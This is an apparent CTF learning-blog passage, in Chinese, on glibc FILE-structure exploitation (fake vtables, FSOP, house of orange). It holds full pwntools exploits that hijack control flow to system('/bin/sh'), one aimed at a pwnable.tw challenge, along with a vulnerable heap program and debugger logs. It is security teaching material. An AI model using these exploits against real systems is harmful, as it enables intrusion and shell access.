_freeres_buf = 0x6161616161616161, __pad5 = 7016996765293437281, _mode = 1633771873, _unused2 = &#39;a&#39; &amp;lt;repeats 20 times&amp;gt; }, vtable = 0x6161616161616161}pwndbg&amp;gt; p &amp;amp;$13-&amp;gt;file-&amp;gt;_lock$14 = (_IO_lock_t **) 0x6010e8 &amp;lt;buf+136&amp;gt;pwndbg&amp;gt; p/x 136$15 = 0x88于是修改poc：p = &#39;a&#39;*0x88 + p64(buf+0x500)p = p.ljust(0x100) + p64(buf)运行结果：─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────*RAX 0x0*RBX 0x601060 (buf) ◂— &#39;a`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;*RCX 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088*RDX 0x6161616161616161 (&#39;aaaaaaaa&#39;)*RDI 0x6161616161616161 (&#39;aaaaaaaa&#39;)*RSI 0x1*RBP 0x0*RSP 0x7fffffffdff0 ◂— 0x0*RIP 0x7ffff7a91562 (free+34) ◂— mov rax, qword ptr [rdi - 8]───────────────────────────────────────[ DISASM ]─────────────────────────────────────── ► 0x7ffff7a91562 &amp;lt;free+34&amp;gt; mov rax, qword ptr [rdi - 8] 0x7ffff7a91566 &amp;lt;free+38&amp;gt; lea rsi, [rdi - 0x10] 0x7ffff7a9156a &amp;lt;free+42&amp;gt; test al, 2 0x7ffff7a9156c &amp;lt;free+44&amp;gt; jne free+96 &amp;lt;free+96&amp;gt; ↓ 0x7ffff7a915a0 &amp;lt;free+96&amp;gt; mov edx, dword ptr [rip + 0x33fbee] &amp;lt;mp_+52&amp;gt;发现并没有call [rax+0x10]，会进入free如何call [rax+0x10]?实际运行流程图：主要还是file structure中一些值的影响，改变了程序逻辑，使得没有做到预期的分支。那么如何获得call [rax+0x10]呢，见上图所示答案是原先payload中开头padding部分 &quot;a&quot;*0x88 改成 &quot;a&quot;.ljust(0x88, &quot;\\x00&quot;)poc改为：p = &#39;a&#39;.ljust(0x88, &#39;\\x00&#39;) + p64(buf+0x500)p = p.ljust(0x100) + p64(buf)运行结果： ─────────────────────────────────────[ REGISTERS ]────────────────────────────────────── *RAX 0x2020202020202020 (&#39; &#39;) *RBX 0x601060 (buf) ◂— 0x61 /* &#39;a&#39; */ *RCX 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088 *RDX 0x601560 ◂— 0x0 *RDI 0x601060 (buf) ◂— 0x61 /* &#39;a&#39; */ *RSI 0x0 *RBP 0xffffffff *RSP 0x7fffffffe070 ◂— 0x0 *RIP 0x7ffff7a7a2ac (fclose+60) ◂— call qword ptr [rax + 0x10] ───────────────────────────────────────[ DISASM ]─────────────────────────────────────── ► 0x7ffff7a7a2ac &amp;lt;fclose+60&amp;gt; call qword ptr [rax + 0x10] 0x7ffff7a7a2af &amp;lt;fclose+63&amp;gt; mov eax, dword ptr [rbx + 0xc0] 0x7ffff7a7a2b5 &amp;lt;fclose+69&amp;gt; test eax, eax 0x7ffff7a7a2b7 &amp;lt;fclose+71&amp;gt; jle fclose+496 &amp;lt;fclose+496&amp;gt;成功控制了RIP分析为什么可以获得call [rax+0x10]，_IO_new_fclose源码如下：所以关键是_flags这个值，会影响进不进_IO_file_close_it还是见上图，第二种情况，payload是&#39;/bin/sh&#39;.ljust(0x88, &#39;\\x00&#39;)时，会获得一次call [rax+0x88]，这个是vtable-&amp;gt;_closepoc：p = &#39;/bin/sh&#39;.ljust(0x88, &#39;\\x00&#39;) + p64(buf+0x50)p = p.ljust(0x100) + p64(buf)运行结果：─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────*RAX 0x2020202020202020 (&#39; &#39;)*RBX 0x601060 (buf) ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */*RCX 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088*RDX 0x0*RDI 0x601060 (buf) ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */*RSI 0x1*RBP 0x0*RSP 0x7fffffffe050 —▸ 0x601060 (buf) ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */*RIP 0x7ffff7a8696a (_IO_file_close_it+282) ◂— call qword ptr [rax + 0x88]───────────────────────────────────────[ DISASM ]─────────────────────────────────────── ► 0x7ffff7a8696a &amp;lt;_IO_file_close_it+282&amp;gt; call qword ptr [rax + 0x88] 0x7ffff7a86970 &amp;lt;_IO_file_close_it+288&amp;gt; mov ebp, eax 0x7ffff7a86972 &amp;lt;_IO_file_close_it+290&amp;gt; jmp _IO_file_close_it+60 &amp;lt;_IO_file_close_it+60&amp;gt; 0x7ffff7a86977 &amp;lt;_IO_file_close_it+295&amp;gt; nop word ptr [rax + rax]_IO_new_file_close_it源码中的调用点如下：我觉得输入/bin/sh开头的payload比较好利用思路：首先如上获得call [rax+0x88]，这个rax的地址是相对于buf偏移为0xd8的vtable。所以需要把vtable指到可以恶意构造的一块地方，称之为fake vtable。然后再vtable+0x88的地址上写入system，由于此时rdi已经是/bin/sh了，所以直接可以拿到shell#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *r = process(&quot;./baby_file&quot;)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()# debug()buf = 0x601060fake_vtable = buf+0x110system_addr = 0x7ffff7a523a0 # PIE &amp;amp; ASLR off, only for debug p = &#39;/bin/sh&#39;.ljust(0x88, &#39;\\x00&#39;) + p64(buf+0x50) # bypass _lockp = p.ljust(0xd8, &#39;\\x00&#39;) + p64(fake_vtable) # fake vtablep = p.ljust(0x100, &#39;\\x00&#39;) + p64(buf) # overflow fpp = p.ljust(0x110+0x88, &#39;\\x00&#39;) + p64(system_addr) # vtable-&amp;gt;_close = systemr.sendline(p)r.interactive()0x02 pwnable.tw上的seethefilefile structure的构造基本和上面的入门题一模一样。程序有一个任意文件读取的功能，通过读取proc/self/maps获得libc地址exp:#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *# r = process(&#39;./seethefile&#39;)# libc = ELF(&#39;/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#39;)r = remote(&#39;chall.pwnable.tw&#39;, 10200)libc = ELF(&#39;./libc.so&#39;)#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()def my_open(filename): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;1&#39;) r.recvuntil(&quot;What do you want to see :&quot;) r.sendline(filename)def my_read(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;2&#39;)def my_write(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;3&#39;)def my_close(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;4&#39;)def my_exit(name): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;5&#39;) r.recvuntil(&quot;Leave your name :&quot;) r.sendline(name)my_open(&#39;/proc/self/maps&#39;)my_read()my_write()my_read()my_write()con = r.recvuntil(&#39;libc&#39;)libc_addr = int(con.split(&#39;\\n&#39;)[-1].split(&#39;-&#39;)[0], 16)system_off = libc.symbols[&#39;system&#39;]system_addr = libc_addr + system_offlog.success(&#39;libc_addr: 0x{:x}&#39;.format(libc_addr))log.success(&#39;system_addr: 0x{:x}&#39;.format(system_addr))# debug()buf = 0x804b260 # size=0x20fake_file_structure = buf+0x200fake_vtable = buf+0x300p = &#39;a&#39;*0x20p += p64(fake_file_structure)p = p.ljust(0x200, &#39;\\x00&#39;) # padding to fake_file_structurep += &#39;/bin/sh&#39;.ljust(0x48, &#39;\\x00&#39;) + p64(buf+0x500) # bypass _lockp = p.ljust(0x200+0x94, &#39;\\x00&#39;) + p64(fake_vtable) # fake vtablep = p.ljust(0x300+0x44, &#39;\\x00&#39;) # padding to fake vtable + 0x44p += p64(system_addr) # vtable-&amp;gt;_closemy_exit(p)#r.sendline(&#39;cd /home/seethefile&#39;) # 这几行IO不是很稳定#r.sendline(&#39;./get_flag&#39;)#r.sendline(&#39;Give me the flag&#39;)r.interactive()0x03 IO_FILE入门：FSOPFSOP利用的本质也是需要去call fake vtable来劫持程序控制流，只是如何去达成call fake vtable的过程有些不一样而已。利用需要劫持_IO_list_all，使其指向恶意构造的file structure, 恶意构造的file structure需要控制好_chain与vtable, 使得最终可以通过call vtable，实现call system(&quot;/bin/sh&quot;)构造好这个fp chain，触发的时机是通过调用_IO_flush_all_lockp，会触发_IO_flush_all_lockp函数的场景有： glibc abort routine exit function main return见_IO_flush_all_lockp源码：int_IO_flush_all_lockp (int do_lock){ int result = 0; struct _IO_FILE *fp; int last_stamp; //... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile (fp); // 关键在这里 if (((fp-&amp;gt;_mode &amp;lt;= 0 &amp;amp;&amp;amp; fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;amp;&amp;amp; fp-&amp;gt;_mode &amp;gt; 0 &amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base))#endif ) &amp;amp;&amp;amp; _IO_OVERFLOW (fp, EOF) == EOF) #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) 目的是可以触发到_IO_OVERFLOW (fp, EOF) == EOF)，它会调用vtable的_overflow函数。程序实际执行逻辑是：取到fp-&amp;gt;vtable中的值，得到vtable的地址，在加上0x18的偏移，得到记录_overflow函数的地址，然后执行该地址处的函数，即call overflow函数。 为什么是0x18? 因为通常vtable指向的是_IO_file_jumps，它是_IO_jump_t类型的结构体，记录了一堆函数。可以看到_IO_file_overflow(也就是_overflow)的偏移是0x18 vtable = 0x7ffff7dd06e0 &amp;lt;_IO_file_jumps&amp;gt;pwndbg&amp;gt; p &amp;amp;_IO_file_jumps$3 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &amp;lt;_IO_file_jumps&amp;gt;pwndbg&amp;gt; tele 0x7ffff7dd06e000:0000│ 0x7ffff7dd06e0 (_IO_file_jumps) ◂— 0x001:0008│ 0x7ffff7dd06e8 (_IO_file_jumps+8) ◂— 0x002:0010│ 0x7ffff7dd06f0 (_IO_file_jumps+16) —▸ 0x7ffff7a869d0 (_IO_file_finish) ◂— push rbx03:0018│ 0x7ffff7dd06f8 (_IO_file_jumps+24) —▸ 0x7ffff7a87740 (_IO_file_overflow) ◂— mov ecx, dword ptr [rdi]04:0020│ 0x7ffff7dd0700 (_IO_file_jumps+32) —▸ 0x7ffff7a874b0 (_IO_file_underflow) ◂— mov eax, dword ptr [rdi]05:0028│ 0x7ffff7dd0708 (_IO_file_jumps+40) —▸ 0x7ffff7a88610 (_IO_default_uflow) ◂— mov rax, qword ptr [rdi + 0xd8]06:0030│ 0x7ffff7dd0710 (_IO_file_jumps+48) —▸ 0x7ffff7a89990 (_IO_default_pbackfail) ◂— push r1507:0038│ 0x7ffff7dd0718 (_IO_file_jumps+56) —▸ 0x7ffff7a861f0 (_IO_file_xsputn) ◂— xor eax, eaxpwndbg&amp;gt;08:0040│ 0x7ffff7dd0720 (_IO_file_jumps+64) —▸ 0x7ffff7a85ed0 (__GI__IO_file_xsgetn) ◂— push r1409:0048│ 0x7ffff7dd0728 (_IO_file_jumps+72) —▸ 0x7ffff7a854d0 (_IO_file_seekoff) ◂— push r140a:0050│ 0x7ffff7dd0730 (_IO_file_jumps+80) —▸ 0x7ffff7a88a10 (_IO_default_seekpos) ◂— mov rax, qword ptr [rdi + 0xd8]0b:0058│ 0x7ffff7dd0738 (_IO_file_jumps+88) —▸ 0x7ffff7a85440 (_IO_file_setbuf) ◂— push rbx0c:0060│ 0x7ffff7dd0740 (_IO_file_jumps+96) —▸ 0x7ffff7a85380 (_IO_file_sync) ◂— push rbx0d:0068│ 0x7ffff7dd0748 (_IO_file_jumps+104) —▸ 0x7ffff7a7a190 (_IO_file_doallocate) ◂— push r120e:0070│ 0x7ffff7dd0750 (_IO_file_jumps+112) —▸ 0x7ffff7a861b0 (_IO_file_read) ◂— test byte ptr [rdi + 0x74], 20f:0078│ 0x7ffff7dd0758 (_IO_file_jumps+120) —▸ 0x7ffff7a85b80 (_IO_file_write) ◂— test rdx, rdx 同时，很重要的一点是 vtable是没有做对齐检查的，这是什么意思呢？ FILE-&amp;gt;vtable指向的应该是一个_IO_jump_t结构体类型的_IO_file_jumps变量，在取fp-&amp;gt;vtable值的时候不会去检查是不是指向了结构体的开头，而是直接拿到vtable地址，然后在该地址上直接加上0x18，就得到目标函数的地址了。 认清楚这一点对于bypass glibc2.24中新增的vtable check至关重要。继续说回_IO_flush_all_lockp，我们知道了目标是_IO_OVERFLOW (fp, EOF) == EOF，触发这行代码之前需要满足一些条件：if (((fp-&amp;gt;_mode &amp;lt;= 0 &amp;amp;&amp;amp; fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;amp;&amp;amp; fp-&amp;gt;_mode &amp;gt; 0 &amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base))也就是满足以下两种条件其一即可 fp-&amp;gt;_mode &amp;lt;= 0 &amp;amp;&amp;amp; fp-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_IO_write_base _IO_vtable_offset (fp) == 0 &amp;amp;&amp;amp; fp-&amp;gt;_mode &amp;gt; 0 &amp;amp;&amp;amp; (fp-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr &amp;gt; fp-&amp;gt;_wide_data-&amp;gt;_IO_write_base)继续说回FSOP，在劫持_IO_list_all时，在CTF中比较常见的场景是通过unsorted bin attack劫持_IO_list_all，使其指向bin (main_arena)，而file structure中_chain的偏移是0x68（64bit下），对应了bin中smallbin[4]的位置。就如经典题目house of orange，最终FSOP利用成功时，fp chain如下图所示接下来，通过一个小程序入门FSOPmagicalloc.c，使用glibc2.23编译，程序获取#include &amp;lt;alloca.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdbool.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;signal.h&amp;gt;void init_proc(){ setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0);}long long read_long(){ char buf[24]; long long choice; __read_chk(0, buf, 23, 24); choice = atoll(buf); return choice;}void read_input(char *buf, unsigned int size){ int ret; ret = __read_chk(0, buf, size, size); if (ret &amp;lt;= 0){ puts(&quot;read error&quot;); _exit(1); } if (buf[ret-1] == &#39;\\n&#39;){ buf[ret-1] = &#39;\\x00&#39;; }}char name[0x20];char *heap[5];bool is_free = false;void allocate(){ size_t size; for (int i = 0; i &amp;lt; 5; i++){ if (!heap[i]){ printf(&quot;size: &quot;); size = read_long(); if (size &amp;lt; 0x78 || size &amp;gt; 0x1000){ puts(&quot;too small or large&quot;); exit(-2); } heap[i] = malloc(size); if (!heap[i]){ puts(&quot;error!&quot;); } return; } puts(&quot;too more!&quot;); }}void dfree(){ unsigned int idx = 0; printf(&quot;Index: &quot;); idx = read_long(); if (idx &amp;lt; 5){ free(heap[idx]); heap[idx] = NULL; }else{ puts(&quot;too large&quot;); }}void edit(){ unsigned int idx = 0; size_t size = 0; printf(&quot;index: &quot;); idx = read_long(); if (idx &amp;lt; 5){ printf(&quot;size:&quot;); size = read_long(); printf(&quot;data:&quot;); read_input(heap[idx], size); }else{ puts(&quot;too large&quot;); }}void show(){ unsigned int idx = 0; printf(&quot;index:&quot;); idx = read_long(); if (idx &amp;lt; 5){ if (heap[idx]){ printf(&quot;name: %s\\n&quot;, name); printf(&quot;context: %s\\n&quot;, heap[idx]); } }else{ puts(&quot;too large&quot;); }}void menu(){ puts(&quot;*************************&quot;); puts(&quot; magic allocate &quot;); puts(&quot;*************************&quot;); puts(&quot; 1. alloc &quot;); puts(&quot; 2. free &quot;); puts(&quot; 3. edit &quot;); puts(&quot; 4. show &quot;); puts(&quot; 5. exit &quot;); puts(&quot;*************************&quot;); printf(&quot;your choice:&quot;);}int main(){ init_proc(); printf(&quot;name: &quot;); read_input(name, 0x20); while(1){ menu(); switch(read_long()){ case 1: allocate(); break; case 2: if(!is_free){ dfree(); }else{ puts(&quot;no more free!&quot;); } is_free = true; break; case 3: edit(); break; case 4: show(); break; case 5: exit(0); break; } }}❯ ldd magicalloc linux-vdso.so.1 (0x00007ffff7ffb000) libc.so.6 =&amp;gt; /home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 (0x00007ffff7806000) /home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)❯ checksec ./magicalloc[*] &#39;/home/sirius/ctf/file_structure/magicalloc&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b&#39;/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/&#39; FORTIFY: Enabled分析一下这个程序： 因为name和heap变量挨着，通过塞满name，在show的时候可以顺带着leak出heap地址 edit函数很明显存在一个越界写，可以通过unsorted bin的fp leak出libc地址 程序设定了只能free一次。在free过一个chunk进入unsorted bin后不能再free了（下面统称这个chunk为chunkA) 可以通过越界写，构造实现FSOP的fp chain 利用越界写，将chunkA的size修改为0x61，伪造成一个small bin[4]；将chunkA的bk改为_IO_list_all-0x10，构造unsorted bin attack；chunkA作为file structure，构造满足FSOP的条件：主要是_IO_write_ptr &amp;gt; _IO_write_base 进行malloc，处理unsorted bin时会将chunkA 放入到smallbin[4]中，同时在对chunkA做unlink时，触发unsorted bin attack。将_IO_list_all指向bin，chunkA也已经构造好FSOP的条件了 现在只需要触发_IO_flush_all_lockp，因为完成unsorted bin attack后，unsorted bin的bk会变成&amp;amp;_IO_list_all-0x10，如果把这片内存当做chunk，其chunk size是0，是非法的。所以在上一条进行malloc，处理unsorted bin时就会引发malloc异常，触发malloc_printerr-&amp;gt;_libc_message-&amp;gt;abort-&amp;gt;_IO_flush_all_lockp 最终拿到shellexp:#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()r = process(&quot;./magicalloc&quot;)libc = ELF(&#39;/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;)def alloc(size): r.recvuntil(&quot;your choice:&quot;) r.sendline(&#39;1&#39;) r.recvuntil(&quot;size:&quot;) r.sendline(str(size))def free(index): r.recvuntil(&quot;your choice:&quot;) r.sendline(&#39;2&#39;) r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))def edit(index, size, data): r.recvuntil(&quot;your choice:&quot;) r.sendline(&#39;3&#39;) r.recvuntil(&quot;index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;size:&quot;) r.sendline(str(size)) r.recvuntil(&quot;data:&quot;) r.sendline(data)def show(index): r.recvuntil(&quot;your choice:&quot;) r.sendline(&#39;4&#39;) r.recvuntil(&quot;index:&quot;) r.sendline(str(index))def exit(): r.recvuntil(&quot;your choice:&quot;) r.sendline(&#39;5&#39;)r.recvuntil(&quot;name:&quot;)r.sendline(&#39;a&#39;*0x20)alloc(0x80) # 0show(0)r.recvuntil(&quot;a&quot;*0x20)heap_addr = u64(r.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &#39;\\x00&#39;)) - 0x10log.success(&#39;heap addr ===&amp;gt; 0x{:x}&#39;.format(heap_addr))alloc(0x80) #1alloc(0x80) #2free(1)edit(0, 0x80+0x10, &#39;a&#39;*0x90)show(0)r.recvuntil(&quot;a&quot;*0x90)libc_addr = u64(r.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &#39;\\x00&#39;)) - 0x3c4b78log.success(&#39;libc addr ===&amp;gt; 0x{:x}&#39;.format(libc_addr))system_off = libc.symbols[&#39;system&#39;]system_addr = libc_addr + system_offio_list_all_off = libc.symbols[&#39;_IO_list_all&#39;]io_list_all_addr = libc_addr + io_list_all_offfake_vtable = heap_addr + 0x300p = &#39;a&#39;*0x80 # padding to unsorted bin chunkp += &#39;/bin/sh\\x00&#39; + p64(0x61) # fake file structure, to smallbin[4], _chainp += p64(0) # fdp += p64(io_list_all_addr - 0x10) # bk, unsorted bin attackp += p64(0) # _IO_write_basep += p64(1) # _IO_write_ptrp += &#39;\\x00&#39;*(0xd8-0x30) # padding to vtablep += p64(fake_vtable)p = p.ljust(0x300-0x10, &#39;\\x00&#39;) # padding to fake_vtablep += &#39;b&#39;*0x18 # padding to vtable-&amp;gt;_overflowp += p64(system_addr)edit(0, len(p), p)# debug(&quot;b *_IO_flush_all_lockp&quot;)alloc(0x300)r.interactive()0x04 house of orange (glibc 2.23) File List: house_of_orange libc.so 过于经典的题目，网上writeup也很多了 https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html https://veritas501.github.io/201712_13-IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/程序功能非常简单，漏洞点也很明显。edit的时候越界写，read没有添加NULL，可以做信息泄露。程序非常特殊的点是没有free功能该题要点： 通过glibc malloc的机制获取free功能 通过越界写，利用unsorted bin来leak libc和heap 通过越界写，实现FSOP（这里利用手法基本和0x03 FSOP入门一模一样，所以不赘述了）关于第一点，如何通过glibc malloc机制获取free功能：malloc时，如果fastbin, unsorted bin, smallbin, large bin, top chunk都不能满足要求时，就会使用sysmalloc来malloc。对应了我画的malloc workflow中这种特殊情况。sysmalloc还没画。找个时间把它画完， 也由于这部分流程没画，所以这里就具体讲一下而sysmalloc中有一条路径，会触发_int_free，free掉top chunk，使得top chunk进入到unsorted bin。上源码： /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &amp;gt;= (unsigned long) (mp_.mmap_threshold) &amp;amp;&amp;amp; (mp_.n_mmaps &amp;lt; mp_.n_mmaps_max))) { char *mm; /* return value from mmap call*/ ..... //这里是mmap分析 这个分支是通过mmap 来malloc，不会触发_int_free，所以不可以满足这个if条件， 而另一个分支是通过brk 来malloc，会触发_int_free 这个if判断的是申请的大小 是否 大于mmap_threshold，也就是申请的size是否大于等于0x20000 显然我们申请的size应该要小于0x20000 old_top = av-&amp;gt;top; old_size = chunksize (old_top); old_end = (char *) (chunk_at_offset (old_top, old_size)); brk = snd_brk = (char *) (MORECORE_FAILURE); /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ // bypass掉这个check assert ((old_top == initial_top (av) &amp;amp;&amp;amp; old_size == 0) || ((unsigned long) (old_size) &amp;gt;= MINSIZE &amp;amp;&amp;amp; prev_inuse (old_top) &amp;amp;&amp;amp; ((unsigned long) old_end &amp;amp; (pagesize - 1)) == 0)); /* Precondition: not enough current space to satisfy nb request */ assert ((unsigned long) (old_size) &amp;lt; (unsigned long) (nb + MINSIZE)); 走brk分支，需要bypass这个check，top chunk需要满足条件： 大于MINSIZE(0x10) 小于申请的size + MINSIZE(0x10) prev inuse位是1 &amp;amp;old_top+old_size对齐到内存页， 也就是(&amp;amp;old_top+old_size) &amp;amp; 0xfff == 0 /* If possible, release the rest. */if (old_size &amp;gt;= MINSIZE){ _int_free (av, old_top, 1);}} brk一顿操作之后，会调用_int_free把原先的top chunk free掉关于第二点，如何leak libc和heap假设目前unsorted bin中已经有chunkA了，unsorted bin -&amp;gt; chunkA 这时malloc一个chunk，size是large bin大小的，但又小于chunkA的size。此时glibc处理unsorted bin时，会将chunkA放入到large bin中，因为申请的size又小于这个large bin，所以会再从large bin中取出来，切割一下，剩余的再放回到unsorted bin中。这样一来一回，申请来的chunk就带回来large bin的fd/bk, fd_nextsize/bk_nextsize。因为fp/bk是unsorted bin中遗传来的，记录了main_arena的地址（获取了libc地址），fd_nextsize/bk_nextsize指向了heap段（获取了heap地址）所以该题思路： 通过溢出修改top_chunk size，从而触发sysmalloc中的_int_free， 获取到unsorted bin 通过unsorted bin布置堆，leak heap和libc 再利用溢出，达成FSOP，拿到shell其实思路还是比较简单的，只能说在当时（2016年）这个知识点比较新，在那时确实是有点难的。最终该题内存布局为：exp：#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()r = process(&quot;./houseoforange&quot;)libc = ELF(&#39;/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#39;)def build(name_length, name, price=12, color=1): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;1&#39;) r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(name_length)) r.recvuntil(&quot;Name :&quot;) r.send(name) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) r.sendline(str(color))def show(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;2&#39;)def edit(name_length, name, price=12, color=1): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;3&#39;) r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(name_length)) r.recvuntil(&quot;Name:&quot;) r.send(name) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) r.sendline(str(color))build(0x20, &#39;a&#39;)p = &#39;a&#39;*0x40 + p64(0) + p64(0xf91)edit(len(p), p)build(0x1000, &#39;b&#39;) # 最大就0x1000build(0x400, &#39;c&#39;*8)show()r.recvuntil(&quot;c&quot;*8)libc_addr = u64(r.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &#39;\\x00&#39;)) - 0x3c5188log.success(&#39;libc addr ===&amp;gt; 0x{:x}&#39;.format(libc_addr))edit(0x10, &#39;c&#39;*0x10)show()r.recvuntil(&quot;c&quot;*0x10)heap_addr = u64(r.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &#39;\\x00&#39;))log.success(&#39;heap addr ===&amp;gt; 0x{:x}&#39;.format(heap_addr))io_list_all_off = libc.symbols[&#39;_IO_list_all&#39;]io_list_all_addr = libc_addr + io_list_all_offfake_vtable = heap_addr + 0x600system_off = libc.symbols[&#39;system&#39;]system_addr = libc_addr + system_offp = &#39;c&#39;*0x420 # padding to unsorted bin chunkp += &#39;/bin/sh\\x00&#39; + p64(0x61) # fake file structure, to smallbin[4], _chainp += p64(0) # fdp += p64(io_list_all_addr - 0x10) # bk, unsorted bin attackp += p64(0) # _IO_write_basep += p64(1) # _IO_write_ptrp += &#39;\\x00&#39;*0xa8 # padding to vtablep += p64(fake_vtable)p = p.ljust(0x600-0x10, &#39;\\x00&#39;) # padding to fake_vtablep += &#39;b&#39;*0x18 # padding to vtable-&amp;gt;_overflowp += p64(system_addr)edit(len(p), p)# debug(&quot;b *_IO_flush_all_lockp&quot;)r.sendline(&#39;1&#39;)r.interactive()[*] Switching to interactive mode [DEBUG] Received 0x199 bytes: &#39;Finish\\n&#39; &#39;+++++++++++++++++++++++++++++++++++++\\n&#39; &#39;@ House of Orange @\\n&#39; &#39;+++++++++++++++++++++++++++++++++++++\\n&#39; &#39; 1. Build the house \\n&#39; &#39; 2. See the house \\n&#39; &#39; 3. Upgrade the house \\n&#39; &#39; 4. Give up \\n&#39; &#39;+++++++++++++++++++++++++++++++++++++\\n&#39; &quot;Your choice : *** Error in `./houseoforange&#39;: malloc(): memory corruption: 0x00007ffff7dd2520 ***\\n&quot;Finish+++++++++++++++++++++++++++++++++++++@ House of Orange @+++++++++++++++++++++++++++++++++++++ 1. Build the house 2. See the house 3. Upgrade the house 4. Give up+++++++++++++++++++++++++++++++++++++Your choice : *** Error in `./houseoforange&#39;: malloc(): memory corruption: 0x00007ffff7dd2520 ***$ ls[DEBUG] Sent 0x3 bytes: &#39;ls\\n&#39;[DEBUG] Received 0x24 bytes: &#39;go.py houseoforange libc.so.63751\\n&#39;go.py houseoforange libc.so.63751$0x05 vtable check bypass关于glibc2.24下新增的vtable check的介绍，如下资料写的很详细了，我就不搬过来了 Play with FILE Structure - Yet Another Binary Exploit Technique https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/所有的libio vtables都被放进了只读的__libc_IO_vtable段，如果超过了边界，则调用_IO_vtable_check做进一步检查void _IO_vtable_check (void) attribute_hidden;/* Perform vtable pointer validation. If validation fails, terminate the process. */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){ /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset 